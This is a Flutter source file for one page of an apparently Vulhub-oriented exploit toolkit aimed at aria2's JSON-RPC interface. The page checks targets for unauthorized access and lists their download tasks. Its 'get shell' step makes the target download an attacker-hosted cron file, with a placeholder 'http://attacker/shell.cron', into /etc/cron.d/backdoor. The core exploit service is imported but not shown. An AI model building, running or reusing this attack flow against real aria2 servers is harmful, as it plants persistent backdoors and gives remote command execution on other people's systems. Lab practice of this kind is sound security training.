import 'package:flutter/material.dart';

import '../../app/constants.dart';
import '../../exp/vulhub/misc_http_exp_service.dart';
import '_vulhub_page_helpers.dart';
import 'base_vulhub_exp_page.dart';
import '../../app/localization.dart';

class Aria2ExpPage extends BaseVulhubExpPage {
  const Aria2ExpPage({super.key});

  @override
  State<Aria2ExpPage> createState() => _Aria2PageState();
}

class _Aria2PageState extends BaseVulhubExpPageState<Aria2ExpPage> {
  @override
  IconData get pageIcon => Icons.download;
  @override
  String get appBarTitle => S.vulhubAria2Title;
  @override
  String get cardTitle => S.vulhubAria2CardTitle;
  @override
  String get cardSubtitle => S.vulhubAria2CardSubtitle;

  final _urlCtrl = TextEditingController();
  final _attackerUrlCtrl = TextEditingController();
  final _timeoutCtrl = TextEditingController();

  Aria2ExpService _svc() => Aria2ExpService(
    baseUrl: _urlCtrl.text.trim(),
    timeout: Duration(seconds: timeoutFrom(_timeoutCtrl)),
  );

  Future<void> _check() async {
    if (_urlCtrl.text.trim().isEmpty) {
      appendLog(S.expLogEnterTargetUrl);
      return;
    }
    setState(() => running = true);
    appendLog('[*] 检测 Aria2 JSON-RPC 未授权访问...');
    try {
      final r = await _svc().check();
      appendLog(
        r.vulnerable ? '[+] ${r.vulnName}: ${r.detail}' : '[-] 未检测到未授权访问',
      );
    } catch (e) {
      appendLog(S.expLogException(e));
    } finally {
      if (mounted) setState(() => running = false);
    }
  }

  Future<void> _listDownloads() async {
    if (_urlCtrl.text.trim().isEmpty) {
      appendLog(S.expLogEnterTargetUrl);
      return;
    }
    setState(() => running = true);
    appendLog('[*] 列出活跃下载任务...');
    try {
      final out = await _svc().listDownloads();
      appendLog(out != null && out.isNotEmpty ? '[+] 响应:\n$out' : '[-] 无响应');
    } catch (e) {
      appendLog(S.expLogException(e));
    } finally {
      if (mounted) setState(() => running = false);
    }
  }

  Future<void> _writeCron() async {
    if (_urlCtrl.text.trim().isEmpty) {
      appendLog(S.expLogEnterTargetUrl);
      return;
    }
    final attackerUrl = _attackerUrlCtrl.text.trim();
    if (attackerUrl.isEmpty) {
      appendLog('[!] 请输入攻击者文件 URL（托管 cron 文件的 HTTP 服务）');
      return;
    }
    setState(() => running = true);
    appendLog('[*] 通过 aria2.addUri 写入 /etc/cron.d/backdoor...');
    appendLog('[*] 下载源: $attackerUrl');
    try {
      final out = await _svc().writeCron(attackerUrl);
      appendLog(out != null && out.isNotEmpty ? '[+] $out' : '[-] 无响应');
    } catch (e) {
      appendLog(S.expLogException(e));
    } finally {
      if (mounted) setState(() => running = false);
    }
  }

  @override
  void dispose() {
    _urlCtrl.dispose();
    _attackerUrlCtrl.dispose();
    _timeoutCtrl.dispose();
    super.dispose();
  }

  @override
  Widget buildLeftPanel(BuildContext context) {
    return SingleChildScrollView(
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          vSecTitle(S.sectionTargetConfig),
          vTf(_urlCtrl, S.fieldTargetUrl, 'http://localhost:6800'),
          const SizedBox(height: 8),
          vTf(
            _timeoutCtrl,
            S.fieldTimeout,
            '${AppConstants.defaultHttpTimeoutSeconds}',
            type: TextInputType.number,
          ),
          const SizedBox(height: 8),
          vBtn('检测未授权', running ? null : _check),
          const SizedBox(height: 8),
          vBtn(S.vulhubAria2BtnListTasks, running ? null : _listDownloads),
          const SizedBox(height: 16),
          vSecTitle(S.vulhubAria2SectionCron),
          vTf(
            _attackerUrlCtrl,
            '攻击者 cron 文件 URL',
            'http://attacker/shell.cron',
          ),
          const SizedBox(height: 8),
          vBtn(S.btnGetShell, running ? null : _writeCron),
        ],
      ),
    );
  }
}
